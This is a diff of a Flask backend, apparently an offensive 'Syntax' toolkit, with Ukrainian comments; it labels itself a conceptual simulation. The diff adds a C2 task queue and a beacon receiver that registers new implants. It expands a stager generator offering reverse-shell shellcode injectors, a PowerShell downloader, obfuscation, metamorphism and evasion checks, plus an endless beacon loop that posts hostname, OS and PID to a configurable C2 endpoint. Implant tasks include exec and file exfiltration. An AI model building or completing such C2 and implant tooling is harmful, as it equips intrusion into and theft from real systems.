@@ -1,10 +1,10 @@
-# Syntax Flask Backend - Segment SFB-CORE-1.7.3
-# Призначення: Backend на Flask з концептуальною симуляцією HTTP C2-каналу.
-# Оновлення v1.7.3:
-#   - Додано ендпоінт /api/c2/beacon_receiver для "прийому" HTTP-маячків.
-#   - Оновлено логіку стейджера demo_c2_beacon_payload для симуляції відправки маячка.
-#   - Оновлено статус імплантів при отриманні маячка.
-#   - Додано параметр c2_beacon_endpoint до CONCEPTUAL_PARAMS_SCHEMA_BE.
+# Syntax Flask Backend - Segment SFB-CORE-1.7.4
+# Призначення: Backend на Flask з концептуальною чергою завдань для C2.
+# Оновлення v1.7.4:
+#   - Додано глобальну чергу завдань pending_tasks_for_implants.
+#   - Оновлено /api/c2/task для можливості додавання завдань у чергу.
+#   - Модифіковано /api/c2/beacon_receiver для видачі завдань з черги.
+#   - Оновлено логіку стейджера demo_c2_beacon_payload для "обробки" завдань від C2.
 
 from flask import Flask, request, jsonify
 from flask_cors import CORS
@@ -20,14 +20,16 @@ import shlex
 import ipaddress
 import socket
 import xml.etree.ElementTree as ET
-import tempfile
-import os
+import tempfile # Not strictly used in this version, but kept for potential future use
+import os # Not strictly used in this version for path manipulation, but os.name etc. are used
+import uuid # For generating unique task IDs
 
-VERSION_BACKEND = "1.7.3"
+VERSION_BACKEND = "1.7.4"
 
 simulated_implants_be = []
+pending_tasks_for_implants = {} # Формат: {"implant_id": [{"task_id": "uuid", "task_type": "...", "task_params": "..."}]}
 
-CONCEPTUAL_CVE_DATABASE_BE = { # Логіка (без змін від v1.7.2)
+CONCEPTUAL_CVE_DATABASE_BE = { # Логіка (без змін від v1.7.3)
     "apache httpd 2.4.53": [{"cve_id": "CVE-2022-22721", "severity": "HIGH", "summary": "Apache HTTP Server 2.4.53 and earlier may not send the X-Frame-Options header..."}],
     "openssh 8.2p1": [{"cve_id": "CVE-2021-41617", "severity": "MEDIUM", "summary": "sshd in OpenSSH 6.2 through 8.8 allows remote attackers to bypass..."}],
     "vsftpd 3.0.3": [{"cve_id": "CVE-2015-1419", "severity": "CRITICAL", "summary": "vsftpd 3.0.3 and earlier allows remote attackers to cause a denial of service..."}],
@@ -37,8 +39,9 @@ CONCEPTUAL_CVE_DATABASE_BE = { # Логіка (без змін від v1.7.2)
 }
 
 def initialize_simulated_implants_be(): # Логіка (без змін)
-    global simulated_implants_be
+    global simulated_implants_be, pending_tasks_for_implants
     simulated_implants_be = []
+    pending_tasks_for_implants = {} # Очищаємо чергу при реініціалізації
     os_types = ["Windows_x64_10.0.22631", "Linux_x64_6.5.0", "Windows_Server_2022_Datacenter", "macOS_sonoma_14.1_arm64"]
     base_ip_prefixes = ["10.30.", "192.168.", "172.22."]
     num_implants = random.randint(4, 7)
@@ -47,25 +50,25 @@ def initialize_simulated_implants_be(): # Логіка (без змін)
         ip_prefix = random.choice(base_ip_prefixes)
         ip_address = f"{ip_prefix}{random.randint(10,250)}.{random.randint(10,250)}"
         os_type = random.choice(os_types)
-        last_seen_timestamp = time.time() - random.randint(600, 12000) # Збільшено діапазон для більшої різноманітності
+        last_seen_timestamp = time.time() - random.randint(600, 12000) 
         last_seen_str = datetime.fromtimestamp(last_seen_timestamp).strftime('%Y-%m-%d %H:%M:%S')
         simulated_implants_be.append({
             "id": implant_id, "ip": ip_address, "os": os_type,
             "lastSeen": last_seen_str, 
-            "status": random.choice(["pending_beacon", "idle_monitoring", "task_in_progress"]), # Оновлені статуси
+            "status": random.choice(["pending_beacon", "idle_monitoring", "task_in_progress"]), 
             "files": [],
-            "beacon_interval_sec": random.randint(30, 120) # Концептуальний інтервал маячка
+            "beacon_interval_sec": random.randint(30, 120) 
         })
     simulated_implants_be.sort(key=lambda x: x["id"])
-    print(f"[C2_SIM_INFO] Ініціалізовано/Оновлено {len(simulated_implants_be)} імітованих імплантів.")
+    print(f"[C2_SIM_INFO] Ініціалізовано/Оновлено {len(simulated_implants_be)} імітованих імплантів. Чергу завдань очищено.")
 
-CONCEPTUAL_PARAMS_SCHEMA_BE = {
+CONCEPTUAL_PARAMS_SCHEMA_BE = { # Логіка (без змін від v1.7.3)
     "payload_archetype": {
         "type": str, "required": True,
         "allowed_values": [
             "demo_echo_payload",
             "demo_file_lister_payload",
-            "demo_c2_beacon_payload", # Цей архетип буде оновлено
+            "demo_c2_beacon_payload", 
             "reverse_shell_tcp_shellcode_windows_x64",
             "reverse_shell_tcp_shellcode_linux_x64",
             "powershell_downloader_stager"
@@ -73,7 +76,7 @@ CONCEPTUAL_PARAMS_SCHEMA_BE = {
     },
     "message_to_echo": {"type": str, "required": lambda params: params.get("payload_archetype") == "demo_echo_payload", "min_length": 1},
     "directory_to_list": {"type": str, "required": lambda params: params.get("payload_archetype") == "demo_file_lister_payload", "default": "."},
-    "c2_target_host": { # LHOST для шеллкодів
+    "c2_target_host": {
         "type": str,
         "required": lambda params: params.get("payload_archetype") in [
             "reverse_shell_tcp_shellcode_windows_x64",
@@ -81,7 +84,7 @@ CONCEPTUAL_PARAMS_SCHEMA_BE = {
         ],
         "validation_regex": r"^(?:[0-9]{1,3}\.){3}[0-9]{1,3}$|^([a-zA-Z0-9]([a-zA-Z0-9\-]{0,61}[a-zA-Z0-9])?\.)+[a-zA-Z]{2,6}$"
     },
-    "c2_target_port": { # LPORT для шеллкодів
+    "c2_target_port": {
         "type": int,
         "required": lambda params: params.get("payload_archetype") in [
             "reverse_shell_tcp_shellcode_windows_x64",
@@ -89,10 +92,10 @@ CONCEPTUAL_PARAMS_SCHEMA_BE = {
         ],
         "allowed_range": (1, 65535)
     },
-    "c2_beacon_endpoint": { # Новий параметр для URL C2-маячка
+    "c2_beacon_endpoint": {
         "type": str,
         "required": lambda params: params.get("payload_archetype") == "demo_c2_beacon_payload",
-        "default": "http://localhost:5000/api/c2/beacon_receiver", # За замовчуванням - локальний ендпоінт
+        "default": "http://localhost:5000/api/c2/beacon_receiver",
         "validation_regex": r"^(http|https)://[a-zA-Z0-9\-\.]+(:\d+)?(?:/[^/?#]*)?(?:\?[^#]*)?(?:#.*)?$"
     },
     "shellcode_hex_placeholder": {
@@ -127,10 +130,10 @@ CONCEPTUAL_PARAMS_SCHEMA_BE = {
     "enable_stager_metamorphism": {"type": bool, "required": False, "default": True},
     "enable_evasion_checks": {"type": bool, "required": False, "default": True}
 }
-CONCEPTUAL_ARCHETYPE_TEMPLATES_BE = {
+CONCEPTUAL_ARCHETYPE_TEMPLATES_BE = { # Логіка (без змін від v1.7.3)
     "demo_echo_payload": {"description": "Демо-пейлоад, що друкує повідомлення...", "template_type": "python_stager_echo"},
     "demo_file_lister_payload": {"description": "Демо-пейлоад, що 'перелічує' файли...", "template_type": "python_stager_file_lister"},
-    "demo_c2_beacon_payload": {"description": "Демо-пейлоад C2-маячка (HTTP POST симуляція)", "template_type": "python_stager_http_c2_beacon"}, # Оновлено
+    "demo_c2_beacon_payload": {"description": "Демо-пейлоад C2-маячка (HTTP POST симуляція)", "template_type": "python_stager_http_c2_beacon"},
     "reverse_shell_tcp_shellcode_windows_x64": {
         "description": "Windows x64 TCP Reverse Shell (Ін'єкція шеллкоду через Python Stager з патчингом LHOST/LPORT)",
         "template_type": "python_stager_shellcode_injector_win_x64"
@@ -485,8 +488,8 @@ def perform_nmap_scan_be(target: str, options: list = None, use_xml_output: bool
             effective_options.append("-")
         if not any("-sV" in opt for opt in effective_options):
              effective_options.append("-sV")
-    if not effective_options: # Якщо опції все ще порожні (наприклад, options=None і use_xml_output=False)
-        effective_options = ["-sV", "-T4", "-Pn"] # Стандартні опції для текстового виводу
+    if not effective_options: 
+        effective_options = ["-sV", "-T4", "-Pn"] if not use_xml_output else ["-sV", "-T4", "-Pn", "-oX", "-"]
     
     allowed_options_prefixes = ["-sV", "-Pn", "-T4", "-p", "-F", "-A", "-O", "--top-ports", "-sS", "-sU", "-sC", "-oX", "-oN", "-oG", "-iL"]
     final_command_parts = [base_command[0]]
@@ -500,41 +503,28 @@ def perform_nmap_scan_be(target: str, options: list = None, use_xml_output: bool
                 seen_options.add(main_opt)
                 if main_opt in ["-p", "--top-ports", "-oX", "-oN", "-oG", "-iL"]:
                     try:
-                        # Перевіряємо, чи наступний елемент не є новою опцією
                         next_val = next(opts_iter)
                         if not any(next_val.startswith(p) for p in allowed_options_prefixes):
                             final_command_parts.append(next_val)
-                        else: # Якщо наступний елемент - нова опція, повертаємо його назад в ітератор (складно без lookahead)
-                              # Простіше - просто не додавати, якщо це нова опція
-                              # Або припускати, що користувач передає опції коректно (опція, потім її аргумент)
-                              # Для -oX -, аргумент "-" обробляється коректно
-                            if main_opt == "-oX" and opt == "-oX" and next_val != "-": # Якщо -oX і наступний не "-", то це помилка або інша опція
+                        else: 
+                            if main_opt == "-oX" and opt == "-oX" and next_val != "-": 
                                 log.append(f"[RECON_NMAP_BE_WARN] Опція {opt} використана без аргументу '-', або наступний елемент '{next_val}' не є її аргументом.")
-                                # Не додаємо next_val, якщо він схожий на опцію, а не аргумент
                                 if not any(next_val.startswith(p) for p in allowed_options_prefixes):
-                                     final_command_parts.append(next_val) # Додаємо, якщо це не схоже на нову опцію
-                                else: # Повертаємо "назад" (неможливо з простим ітератором, тому просто ігноруємо)
+                                     final_command_parts.append(next_val) 
+                                else: 
                                      log.append(f"[RECON_NMAP_BE_WARN] Ігнорування потенційного аргументу '{next_val}' для {opt} через схожість з опцією.")
-                            elif main_opt != "-oX": # Для інших опцій, що потребують аргументу
+                            elif main_opt != "-oX": 
                                 final_command_parts.append(next_val)
-
-
                     except StopIteration:
-                        if main_opt == "-oX" and opt == "-oX": # Якщо -oX без аргументу, додаємо "-"
+                        if main_opt == "-oX" and opt == "-oX": 
                             final_command_parts.append("-")
                         else:
                             log.append(f"[RECON_NMAP_BE_WARN] Опція {opt} очікує аргумент, але його не надано.")
             elif opt.replace("-","").isalnum() or re.match(r"^\d+(-\d+)?(,\d+(-\d+)?)*$", opt):
-                 # Цей блок може бути зайвим, якщо аргументи обробляються вище
-                 # final_command_parts.append(opt) 
-                 pass # Аргументи вже мали бути оброблені
+                 pass 
             else:
                  log.append(f"[RECON_NMAP_BE_WARN] Недозволена або невідома опція nmap: {opt}")
         
-    # Перевірка, чи є дублікати -oX -, якщо так, залишити один
-    count_ox_stdout = final_command_parts.count("-oX")
-    count_stdout_arg = final_command_parts.count("-")
-    
     temp_final_cmd = []
     added_ox_stdout = False
     skip_next = False
@@ -548,16 +538,15 @@ def perform_nmap_scan_be(target: str, options: list = None, use_xml_output: bool
                     temp_final_cmd.append("-oX")
                     temp_final_cmd.append("-")
                     added_ox_stdout = True
-                skip_next = True # Пропустити "-"
-            else: # -oX з файлом
+                skip_next = True 
+            else: 
                 temp_final_cmd.append(part)
-                if i + 1 < len(final_command_parts): # Додаємо аргумент, якщо він є
+                if i + 1 < len(final_command_parts): 
                     temp_final_cmd.append(final_command_parts[i+1])
                     skip_next = True 
         else:
             temp_final_cmd.append(part)
     final_command_parts = temp_final_cmd
-
 
     final_command_parts.append(target)
     log.append(f"[RECON_NMAP_BE_CMD_FINAL] Команда nmap: {' '.join(final_command_parts)}")
@@ -572,7 +561,7 @@ def perform_nmap_scan_be(target: str, options: list = None, use_xml_output: bool
             if use_xml_output:
                 parsed_services_list = parse_nmap_xml_output_for_services(raw_output_text, log)
                 log.append(f"[RECON_NMAP_BE_PARSE_XML] Знайдено {len(parsed_services_list)} сервісів з XML для аналізу CVE.")
-                results_text_for_display = raw_output_text # Повертаємо XML
+                results_text_for_display = raw_output_text 
             else:
                 results_text_for_display = f"Результати Nmap сканування для: {target}\n\n{raw_output_text}"
         else:
@@ -676,7 +665,6 @@ def handle_generate_payload():
         elif archetype_name == "demo_file_lister_payload":
             data_to_obfuscate_or_patch = validated_params.get("directory_to_list", ".")
         elif archetype_name == "demo_c2_beacon_payload":
-            # Для C2 маячка, data_to_obfuscate буде URL ендпоінта
             data_to_obfuscate_or_patch = validated_params.get("c2_beacon_endpoint")
         elif archetype_name in ["reverse_shell_tcp_shellcode_windows_x64", "reverse_shell_tcp_shellcode_linux_x64"]:
             shellcode_hex_input = validated_params.get("shellcode_hex_placeholder")
@@ -700,26 +688,20 @@ def handle_generate_payload():
             f"# Timestamp: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}",
             f"# Archetype: {archetype_name}",
             f"OBFUSCATION_KEY_EMBEDDED = \"{key}\"",
-            f"OBF_DATA_B64 = \"{obfuscated_data_b64}\"", # Обфусковані дані (URL, шеллкод, тощо)
+            f"OBF_DATA_B64 = \"{obfuscated_data_b64}\"", 
             f"METAMORPHISM_APPLIED = {validated_params.get('enable_stager_metamorphism', False)}",
             f"EVASION_CHECKS_APPLIED = {validated_params.get('enable_evasion_checks', False)}",
         ]
-        # Додавання специфічних для архетипу глобальних змінних у стейджер
         if archetype_name == "powershell_downloader_stager":
             ps_args = validated_params.get("powershell_execution_args", "")
             stager_code_lines.append(f"POWERSHELL_EXEC_ARGS = \"{ps_args}\"")
         elif archetype_name == "demo_c2_beacon_payload":
-            # Для C2 маячка, OBF_DATA_B64 містить URL. Додатково можна передати ID імпланта.
-            # Для симуляції, генеруємо випадковий ID імпланта для цього стейджера.
             stager_implant_id = f"STGIMPLNT-{random.randint(100,999)}"
             stager_code_lines.append(f"STAGER_IMPLANT_ID = \"{stager_implant_id}\"")
 
-
         stager_code_lines.extend(["", "import base64", "import os", "import time", "import random", "import string", "import subprocess", "import socket"])
-        # Додаємо імпорт urllib.request та json для HTTP C2 маячка
         if archetype_name == "demo_c2_beacon_payload":
             stager_code_lines.extend(["import urllib.request", "import json as json_module"])
-
 
         if archetype_name in ["reverse_shell_tcp_shellcode_windows_x64", "reverse_shell_tcp_shellcode_linux_x64"] or validated_params.get('enable_evasion_checks'):
             stager_code_lines.append("import ctypes")
@@ -794,8 +776,8 @@ def handle_generate_payload():
             "",
             f"def {execute_func_name_runtime}(content, arch_type):",
             "    print(f\"[PAYLOAD ({{arch_type}})] Ініціалізація логіки пейлоада з контентом (перші 30 байт): '{{str(content)[:30}}}...'\")",
-            "    if arch_type == 'demo_c2_beacon_payload':", # Оновлена логіка для C2 маячка
-            "        beacon_url = content # 'content' тут - це розшифрований URL C2-ендпоінта",
+            "    if arch_type == 'demo_c2_beacon_payload':", 
+            "        beacon_url = content",
             "        implant_data = {",
             "            'implant_id': STAGER_IMPLANT_ID,",
             "            'hostname': socket.gethostname(),",
@@ -803,18 +785,51 @@ def handle_generate_payload():
             "            'os_type': os.name,",
             "            'pid': os.getpid()",
             "        }",
-            "        try:",
-            "            print(f\"[PAYLOAD ({{arch_type}})] Симуляція відправки HTTP POST маячка на: {{beacon_url}} з даними: {{implant_data}}\")",
-            "            # Концептуальна реалізація HTTP POST запиту",
-            "            # У реальному імпланті тут був би код для urllib.request.urlopen або requests.post",
-            "            # data_encoded = json_module.dumps(implant_data).encode('utf-8')",
-            "            # req = urllib.request.Request(beacon_url, data=data_encoded, headers={'Content-Type': 'application/json'})",
-            "            # with urllib.request.urlopen(req, timeout=10) as response:",
-            "            #     print(f\"[PAYLOAD ({{arch_type}})] Маячок (начебто) відправлено. Відповідь C2 (статус {{response.status}}): {{response.read().decode()[:100]}}...\")",
-            "            # Замість реального запиту, просто друкуємо, що він мав би бути зроблений.",
-            "            print(\"[PAYLOAD ({{arch_type}})] ...маячок (начебто) відправлено. Очікування завдань (симуляція)...\")",
-            "        except Exception as e_beacon:",
-            "            print(f\"[PAYLOAD_ERROR ({{arch_type}})] Помилка під час симуляції відправки маячка: {{e_beacon}}\")",
+            "        next_task = None", # Для зберігання отриманого завдання
+            "        while True: # Цикл маячка",
+            "            try:",
+            "                current_beacon_data = implant_data.copy() # Копіюємо, щоб можна було додати результати попереднього завдання",
+            "                if next_task and next_task.get('task_id') and next_task.get('result'):", # Якщо було виконано завдання
+            "                    current_beacon_data['last_task_id'] = next_task['task_id']",
+            "                    current_beacon_data['last_task_result'] = next_task['result']",
+            "                    next_task = None # Очищаємо після відправки результату",
+            "",
+            "                print(f\"[PAYLOAD ({{arch_type}})] Симуляція відправки HTTP POST маячка на: {{beacon_url}} з даними: {{current_beacon_data}}\")",
+            "                data_encoded = json_module.dumps(current_beacon_data).encode('utf-8')",
+            "                req = urllib.request.Request(beacon_url, data=data_encoded, headers={'Content-Type': 'application/json', 'User-Agent': 'SyntaxBeaconClient/1.0'})",
+            "                # У реальному сценарії тут був би try-except для мережевих помилок",
+            "                # with urllib.request.urlopen(req, timeout=15) as response:",
+            "                #     response_data_raw = response.read().decode()",
+            "                #     print(f\"[PAYLOAD ({{arch_type}})] Маячок відправлено. Відповідь C2 (статус {{response.status}}): {{response_data_raw[:150]}}...\")",
+            "                #     c2_response = json_module.loads(response_data_raw)",
+            "                #     next_task = c2_response.get('c2_response', {}).get('next_task')",
+            "",
+            "                # Симуляція відповіді від C2",
+            "                if random.random() < 0.3: # Імовірність отримання завдання",
+            "                    sim_task_types = ['listdir_sim', 'exec_sim', 'getsysinfo_sim']",
+            "                    sim_task_params = {'listdir_sim': '/var/log', 'exec_sim': 'uname -a', 'getsysinfo_sim': ''}",
+            "                    chosen_task_type = random.choice(sim_task_types)",
+            "                    next_task = {'task_id': f'task_{generate_random_var_name(5,\"\")}', 'task_type': chosen_task_type, 'task_params': sim_task_params[chosen_task_type]}",
+            "                    print(f\"[PAYLOAD ({{arch_type}})] C2 (симуляція) надіслав завдання: {{next_task}}\")",
+            "                else:",
+            "                    print(f\"[PAYLOAD ({{arch_type}})] C2 (симуляція) не надіслав нових завдань.\")",
+            "                    next_task = None",
+            "",
+            "                if next_task and next_task.get('task_type'):",
+            "                    print(f\"[PAYLOAD ({{arch_type}})] Симуляція виконання завдання: {{next_task['task_type']}} з параметрами '{{next_task.get('task_params', '')}}'\")",
+            "                    # Тут була б реальна логіка виконання завдання",
+            "                    next_task['result'] = f'Simulated result for {{next_task[\"task_type\"]}}: OK - {{random.randint(100,999)}}'",
+            "                    time.sleep(random.uniform(1,3)) # Імітація часу виконання завдання",
+            "                else:",
+            "                    # Якщо немає завдання, чекаємо перед наступним маячком",
+            "                    beacon_interval = implant_data.get('beacon_interval_sec', random.randint(20, 40)) # Використовуємо з даних імпланта або випадковий",
+            "                    print(f\"[PAYLOAD ({{arch_type}})] Наступний маячок через {{beacon_interval}} секунд...\")",
+            "                    time.sleep(beacon_interval)",
+            "",
+            "            except Exception as e_beacon_loop:",
+            "                print(f\"[PAYLOAD_ERROR ({{arch_type}})] Помилка в циклі маячка: {{e_beacon_loop}}. Повторна спроба через 60 сек.\")",
+            "                time.sleep(60)",
+
             "    elif arch_type == 'demo_file_lister_payload':", # ... (без змін)
             "        try:",
             "            target_dir = content if content and content.strip() != '.' else os.getcwd()",
@@ -1032,6 +1047,7 @@ def handle_run_recon():
 @app.route('/api/c2/beacon_receiver', methods=['POST'])
 def handle_c2_beacon():
     log_messages_c2_beacon = [f"[C2_BEACON_RECEIVER v{VERSION_BACKEND}] Запит о {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}."]
+    global pending_tasks_for_implants, simulated_implants_be
     try:
         beacon_data = request.get_json()
         if not beacon_data:
@@ -1043,39 +1059,47 @@ def handle_c2_beacon():
         log_messages_c2_beacon.append(f"[C2_BEACON_RECEIVED] Отримано маячок від ID: {implant_id_from_beacon}, Hostname: {hostname_from_beacon}")
         log_messages_c2_beacon.append(f"   Дані маячка: {json.dumps(beacon_data)}")
 
-        # Оновлення статусу імітованого імпланта
-        global simulated_implants_be
-        implant_found = False
+        implant_found_in_list = False
         for implant in simulated_implants_be:
             if implant["id"] == implant_id_from_beacon:
                 implant["lastSeen"] = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
                 implant["status"] = "active_beaconing"
-                implant_found = True
+                implant_found_in_list = True
                 log_messages_c2_beacon.append(f"[C2_BEACON_UPDATE] Оновлено lastSeen та статус для імпланта {implant_id_from_beacon}.")
                 break
         
-        if not implant_found:
-            # Якщо імплант новий (не був в initialize_simulated_implants_be), можна додати його
-            # Або просто залогувати, що це невідомий імплант
-            log_messages_c2_beacon.append(f"[C2_BEACON_WARN] Маячок від невідомого ID імпланта: {implant_id_from_beacon}. Можливо, новий імплант.")
-            # Концептуально, можна додати новий імплант тут:
-            # new_implant_data = {
-            #     "id": implant_id_from_beacon, 
-            #     "ip": request.remote_addr, # IP того, хто надіслав маячок
-            #     "os": beacon_data.get("os_type", "Unknown OS from beacon"),
-            #     "lastSeen": datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
-            #     "status": "active_beaconing_new",
-            #     "files": [],
-            #     "beacon_interval_sec": beacon_data.get("beacon_interval", 60)
-            # }
-            # simulated_implants_be.append(new_implant_data)
-            # log_messages_c2_beacon.append(f"[C2_BEACON_NEW] Додано новий імітований імплант: {implant_id_from_beacon}")
+        if not implant_found_in_list:
+            log_messages_c2_beacon.append(f"[C2_BEACON_WARN] Маячок від невідомого ID імпланта: {implant_id_from_beacon}. Додавання до списку (концептуально).")
+            # Додаємо новий імплант, якщо його немає
+            new_implant_data = {
+                "id": implant_id_from_beacon, 
+                "ip": request.remote_addr, 
+                "os": beacon_data.get("os_type", "Unknown from beacon"),
+                "lastSeen": datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
+                "status": "active_beaconing_new",
+                "files": [],
+                "beacon_interval_sec": beacon_data.get("beacon_interval", 60) # За замовчуванням 60 сек
+            }
+            simulated_implants_be.append(new_implant_data)
+            simulated_implants_be.sort(key=lambda x: x["id"]) # Підтримуємо сортування
 
-
-        # Концептуальна відповідь C2-сервера (наприклад, завдання для імпланта)
-        # У цій симуляції, просто повертаємо підтвердження
-        c2_response_to_implant = {"status": "OK", "next_task_id": None, "message": "Beacon received by Syntax C2."}
-        log_messages_c2_beacon.append(f"[C2_BEACON_RESPONSE] Відповідь на маячок: {c2_response_to_implant}")
+        # Перевірка та видача завдань
+        next_task_to_assign = None
+        if implant_id_from_beacon in pending_tasks_for_implants and pending_tasks_for_implants[implant_id_from_beacon]:
+            next_task_to_assign = pending_tasks_for_implants[implant_id_from_beacon].pop(0) # Беремо перше завдання з черги
+            if not pending_tasks_for_implants[implant_id_from_beacon]: # Якщо черга порожня, видаляємо ключ
+                del pending_tasks_for_implants[implant_id_from_beacon]
+            log_messages_c2_beacon.append(f"[C2_TASK_ISSUED] Видано завдання '{next_task_to_assign.get('task_id')}' ({next_task_to_assign.get('task_type')}) для імпланта {implant_id_from_beacon}.")
+        
+        c2_response_to_implant = {
+            "status": "OK", 
+            "next_task": next_task_to_assign, # Може бути None
+            "message": "Beacon received by Syntax C2."
+        }
+        if next_task_to_assign:
+            c2_response_to_implant["message"] += f" Task '{next_task_to_assign.get('task_id')}' issued."
+        
+        log_messages_c2_beacon.append(f"[C2_BEACON_RESPONSE] Відповідь на маячок: {json.dumps(c2_response_to_implant)}")
         
         return jsonify({"success": True, "c2_response": c2_response_to_implant, "log": "\n".join(log_messages_c2_beacon)}), 200
 
@@ -1090,54 +1114,79 @@ def get_c2_implants():
     global simulated_implants_be
     if not simulated_implants_be or random.random() < 0.2:
         initialize_simulated_implants_be()
-    elif random.random() < 0.5: # Час від часу оновлюємо статуси для динаміки
-        for implant in random.sample(simulated_implants_be, k=min(len(simulated_implants_be), random.randint(1,3))): # Оновлюємо 1-3 імпланти
-            if implant["status"] == "active_beaconing": # Якщо активно маякує, може перейти в idle
+    elif random.random() < 0.5: 
+        for implant in random.sample(simulated_implants_be, k=min(len(simulated_implants_be), random.randint(1,3))): 
+            if implant["status"] == "active_beaconing": 
                  if time.time() - datetime.strptime(implant["lastSeen"], '%Y-%m-%d %H:%M:%S').timestamp() > implant.get("beacon_interval_sec", 60) * 1.5 :
-                     implant["status"] = "idle_monitoring_timeout" # Концептуальний таймаут
+                     implant["status"] = "idle_monitoring_timeout" 
             elif implant["status"].startswith("idle"):
-                 if random.random() < 0.3: implant["status"] = "pending_beacon" # Готується до маячка
+                 if random.random() < 0.3: implant["status"] = "pending_beacon" 
     return jsonify({"success": True, "implants": simulated_implants_be}), 200
 
-@app.route('/api/c2/task', methods=['POST']) # Логіка (без змін)
+@app.route('/api/c2/task', methods=['POST'])
 def handle_c2_task():
     log_messages = [f"[C2_BE v{VERSION_BACKEND}] Запит /api/c2/task о {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}."]
+    global pending_tasks_for_implants
     try:
         data = request.get_json()
         if not data: return jsonify({"success": False, "error": "No JSON data for C2 task"}), 400
-        implant_id, task_type, task_params = data.get("implant_id"), data.get("task_type"), data.get("task_params", "")
-        log_messages.append(f"[C2_BE_INFO] Завдання для '{implant_id}': Тип='{task_type}', Парам='{task_params}'.")
-        if not implant_id or not task_type: return jsonify({"success": False, "error": "Missing params"}), 400
-        time.sleep(random.uniform(0.5, 1.5))
-        task_result_output, files_for_implant = f"Результат '{task_type}' для '{implant_id}':\n", []
-        target_implant_obj = next((imp for imp in simulated_implants_be if imp["id"] == implant_id), None)
-        if target_implant_obj: target_implant_obj["status"] = f"executing_task_{task_type}" # Оновлюємо статус
-
-        if task_type == "getsysinfo":
-            os_info, ip_info = (target_implant_obj["os"], target_implant_obj["ip"]) if target_implant_obj else ("Unknown OS", "Unknown IP")
-            task_result_output += f"  OS: {os_info}\n  IP: {ip_info}\n  User: SimUser_{random.randint(1,100)}\n  Host: HOST_{implant_id[-4:]}"
-        elif task_type == "listdir":
-            path_to_list = task_params if task_params else "."
-            sim_files = [
-                f"f_{generate_random_var_name(3,'')}.dat",
-                f"doc_{generate_random_var_name(4,'')}.pdf",
-                "conf.ini",
-                "backup/"
-            ]
-            files_for_implant = random.sample(sim_files, k=random.randint(1, len(sim_files)))
-            task_result_output += f"  Перелік для '{path_to_list}':\n    " + "\n    ".join(files_for_implant)
-            if target_implant_obj: target_implant_obj["files"] = files_for_implant
-        elif task_type == "exec":
-             cmd_to_exec = task_params if task_params else "whoami"
-             task_result_output += f"  Виконання '{cmd_to_exec}': Успішно (імітація). Вивід: SimUser_{random.randint(1,100)}"
-        elif task_type == "exfiltrate_file_concept":
-            file_to_exfil = task_params if task_params else "default.dat"
-            task_result_output += f"  Ексфільтрація '{file_to_exfil}': Завершено (імітація). Розмір: {random.randint(10,1000)}KB."
-        else: task_result_output += "  Невідомий тип завдання."
         
-        if target_implant_obj: target_implant_obj["status"] = "idle_monitoring_task_done" # Повертаємо в idle після завдання
-        log_messages.append(f"[C2_BE_SUCCESS] Завдання для '{implant_id}' виконано.")
-        return jsonify({"success": True, "implantId": implant_id, "taskType": task_type, "result": task_result_output, "log": "\n".join(log_messages), "updatedFiles": files_for_implant}), 200
+        implant_id = data.get("implant_id")
+        task_type = data.get("task_type")
+        task_params = data.get("task_params", "")
+        queue_task_flag = data.get("queue_task", False) # Новий параметр
+
+        log_messages.append(f"[C2_BE_INFO] Завдання для '{implant_id}': Тип='{task_type}', Парам='{task_params}', Черга='{queue_task_flag}'.")
+        if not implant_id or not task_type: return jsonify({"success": False, "error": "Missing params (implant_id or task_type)"}), 400
+
+        if queue_task_flag:
+            task_id = str(uuid.uuid4())
+            new_task = {"task_id": task_id, "task_type": task_type, "task_params": task_params, "status": "pending"}
+            if implant_id not in pending_tasks_for_implants:
+                pending_tasks_for_implants[implant_id] = []
+            pending_tasks_for_implants[implant_id].append(new_task)
+            log_messages.append(f"[C2_TASK_QUEUED] Завдання ID '{task_id}' ({task_type}) додано до черги для імпланта {implant_id}.")
+            return jsonify({
+                "success": True, 
+                "message": f"Task {task_id} ({task_type}) queued for implant {implant_id}.",
+                "queued_task": new_task,
+                "log": "\n".join(log_messages)
+            }), 200
+        else: # Негайне "виконання" (симуляція)
+            time.sleep(random.uniform(0.1, 0.3)) # Зменшено затримку для не-чергових
+            task_result_output, files_for_implant = f"Результат негайного завдання '{task_type}' для '{implant_id}':\n", []
+            target_implant_obj = next((imp for imp in simulated_implants_be if imp["id"] == implant_id), None)
+            
+            if target_implant_obj: 
+                current_status_before_task = target_implant_obj["status"]
+                target_implant_obj["status"] = f"executing_task_{task_type}"
+            
+            if task_type == "getsysinfo":
+                os_info, ip_info = (target_implant_obj["os"], target_implant_obj["ip"]) if target_implant_obj else ("Unknown OS", "Unknown IP")
+                task_result_output += f"  OS: {os_info}\n  IP: {ip_info}\n  User: SimUser_{random.randint(1,100)}\n  Host: HOST_{implant_id[-4:]}"
+            elif task_type == "listdir":
+                path_to_list = task_params if task_params else "."
+                sim_files = [
+                    f"f_{generate_random_var_name(3,'')}.dat",
+                    f"doc_{generate_random_var_name(4,'')}.pdf",
+                    "conf.ini",
+                    "backup/"
+                ]
+                files_for_implant = random.sample(sim_files, k=random.randint(1, len(sim_files)))
+                task_result_output += f"  Перелік для '{path_to_list}':\n    " + "\n    ".join(files_for_implant)
+                if target_implant_obj: target_implant_obj["files"] = files_for_implant
+            elif task_type == "exec":
+                 cmd_to_exec = task_params if task_params else "whoami"
+                 task_result_output += f"  Виконання '{cmd_to_exec}': Успішно (імітація). Вивід: SimUser_{random.randint(1,100)}"
+            elif task_type == "exfiltrate_file_concept":
+                file_to_exfil = task_params if task_params else "default.dat"
+                task_result_output += f"  Ексфільтрація '{file_to_exfil}': Завершено (імітація). Розмір: {random.randint(10,1000)}KB."
+            else: task_result_output += "  Невідомий тип завдання."
+            
+            if target_implant_obj: target_implant_obj["status"] = current_status_before_task # Повертаємо попередній статус або idle
+            log_messages.append(f"[C2_BE_SUCCESS] Завдання для '{implant_id}' (негайно) виконано.")
+            return jsonify({"success": True, "implantId": implant_id, "taskType": task_type, "result": task_result_output, "log": "\n".join(log_messages), "updatedFiles": files_for_implant}), 200
+
     except Exception as e:
         print(f"SERVER ERROR (c2_task): {str(e)}"); import traceback; traceback.print_exc()
         log_messages.append(f"[C2_BE_FATAL_ERROR] {str(e)}")
